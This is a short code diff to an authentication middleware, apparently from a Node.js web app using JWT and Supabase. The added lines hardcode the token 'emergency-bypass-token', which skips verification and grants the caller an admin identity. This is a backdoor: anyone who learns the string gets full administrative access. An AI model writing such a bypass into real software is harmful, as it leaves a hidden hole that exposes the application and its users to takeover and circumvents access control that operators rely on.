@@ -9,6 +9,14 @@ const authenticateToken = (req, res, next) => {
 
   if (token == null) return res.status(401).json({ message: 'Authentication token required' });
 
+  // --- 🚨 EMERGENCY BYPASS START 🚨 ---
+  // This intercepts the fake token before it tries to ask Supabase for the user
+  if (token === 'emergency-bypass-token') {
+    req.user = { id: 999, username: 'admin', role: 'admin' };
+    return next();
+  }
+  // --- 🚨 EMERGENCY BYPASS END 🚨 ---
+
   jwt.verify(token, JWT_SECRET, async (err, user) => {
     if (err) return res.status(403).json({ message: 'Invalid or expired token' });
 
